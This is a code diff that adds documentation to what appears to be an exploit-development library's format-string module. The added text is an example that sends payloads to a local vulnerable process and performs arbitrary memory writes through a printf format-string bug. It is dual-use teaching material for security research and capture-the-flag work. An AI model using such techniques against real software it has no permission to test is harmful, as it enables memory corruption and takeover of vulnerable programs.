@@ -1,3 +1,30 @@
+"""
+Provide some tools to exploit format string bug
+
+Example - Automated exploitation
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+::
+
+	# Assume a process that reads a string
+	# and gives this string as the first argument
+	# of a printf() call
+	# It do this indefinitely
+	p = process('./vulnerable')
+
+	# Function called in order to send a payload
+	def send_payload(payload):
+		log.info("payload = %s" % repr(payload))
+		p.sendline(payload)
+		return p.recv()
+
+	# Create a FmtStr object and give to him the function
+	format_string = fmtstr.FmtStr(execute_fmt=send_payload)
+	format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
+	format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
+	format_string.execute_writes()
+
+"""
 import logging
 import re
 
